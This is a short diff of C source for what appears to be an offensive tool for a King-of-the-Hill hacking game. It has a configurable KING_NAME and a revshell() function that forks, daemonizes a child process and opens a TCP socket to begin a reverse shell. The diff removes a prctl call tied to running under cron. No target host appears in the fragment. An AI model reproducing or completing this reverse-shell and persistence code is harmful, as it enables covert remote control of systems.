@@ -24,7 +24,6 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #include <time.h>
-#include <sys/prctl.h>
 
 //change these
 #define KING_NAME "Arnout" //put your nickname here
@@ -198,7 +197,6 @@ void revshell() {
     pid_t pid = fork(); //spawn a child process
 
     if (pid == 0) { //check if we are the child process
-        prctl(PR_SET_PDEATHSIG, 0); //don't send any SIGCHILD signals to cron
         daemon(0, 1); //daemonize the child process
 
         int sockfd = socket(AF_INET, SOCK_STREAM, 0); //open a socket file descriptor
